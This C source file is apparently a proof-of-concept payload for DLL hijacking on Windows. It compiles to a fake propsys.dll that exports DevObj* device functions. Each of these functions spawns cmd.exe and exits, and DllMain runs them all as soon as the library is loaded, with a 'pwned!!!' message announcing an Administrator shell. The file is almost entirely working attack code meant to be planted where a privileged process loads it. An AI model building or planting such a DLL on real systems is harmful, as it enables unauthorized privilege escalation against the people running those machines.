#include <windows.h> 
#include <Winuser.h> 
 
// x86-w64-mingw32-gcc -shared -o propsys.dll propsys.c -lcomctl32 -Wl,--subsystem,windows  

//  @404death

int DevObjCreateDeviceInfoList(){
//    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
    WinExec("C:\\windows\\system32\\cmd.exe", 1);
    ExitProcess(0);
    return 0;
}
int DevObjDestroyDeviceInfoList(){
//    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
    WinExec("C:\\windows\\system32\\cmd.exe", 1);
    ExitProcess(0);
    return 0;
}
int DevObjEnumDeviceInfo(){
    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
    WinExec("C:\\windows\\system32\\cmd.exe", 1);
    ExitProcess(0);
    return 0;
}
int DevObjGetClassDevs(){
//    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
    WinExec("C:\\windows\\system32\\cmd.exe", 1);
    ExitProcess(0);
    return 0;
}
int DevObjGetDeviceInstanceId(){
//    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
    WinExec("C:\\windows\\system32\\cmd.exe", 1);
    ExitProcess(0);
    return 0;
}
int DevObjOpenDevRegKey(){
//    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
    WinExec("C:\\windows\\system32\\cmd.exe", 1);
    ExitProcess(0);
    return 0;
}
int DevObjUninstallDevice(){
//    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
    WinExec("C:\\windows\\system32\\cmd.exe", 1);
    ExitProcess(0);
    return 0;
}
BOOL WINAPI DllMain (HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)  
{  
  if (fdwReason == DLL_PROCESS_ATTACH)  
  {  
    DevObjCreateDeviceInfoList(); 
    DevObjDestroyDeviceInfoList(); 
    DevObjEnumDeviceInfo(); 
    DevObjGetClassDevs(); 
    DevObjGetDeviceInstanceId(); 
    DevObjOpenDevRegKey(); 
    DevObjUninstallDevice(); 
 }  
  
  return TRUE;  
}  